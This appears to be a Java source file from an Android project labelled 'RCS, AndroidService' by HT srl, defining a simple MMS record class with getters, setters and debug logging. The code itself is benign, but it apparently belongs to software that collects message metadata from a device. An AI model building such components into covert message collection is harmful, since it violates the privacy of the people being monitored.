/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : Mms.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service;

import android.util.Log;

public class Mms {
	private static final String TAG = "Mms";

	public static boolean RECEIVED = false;
	public static boolean SENT = true;

	private String address, subject;
	private long date;
	private boolean sent; // false - received, true - sent

	private int thread_id, id;

	public Mms(String address, String subject, long date, boolean sent) {
		this.address = address;
		this.subject = subject;
		this.date = date;
		this.sent = sent;
	}

	public void print() {
		Log.d("QZ", TAG + " (print): Address: " + address);
		Log.d("QZ", TAG + " (print): Subject: " + subject);
		Log.d("QZ", TAG + " (print): Date: " + date);
		Log.d("QZ", TAG + " (print): Sent: " + sent);
		Log.d("QZ", TAG + " (print): Thread_id: " + thread_id);
		Log.d("QZ", TAG + " (print): Id: " + id);
	}

	public String getAddress() {
		return address;
	}

	public void setAddress(String address) {
		this.address = address;
	}

	public String getSubject() {
		return subject;
	}

	public void setSubject(String subject) {
		this.subject = subject;
	}

	public void setDate(long date) {
		this.date = date;
	}

	public long getDate() {
		return date;
	}

	public boolean getSent() {
		return sent;
	}

	public void setSent(boolean sent) {
		this.sent = sent;
	}

	public void setThreadId(int thread_id) {
		this.thread_id = thread_id;
	}

	public int getThreadId() {
		return thread_id;
	}

	public void setId(int id) {
		this.id = id;
	}

	public int getId() {
		return id;
	}
}
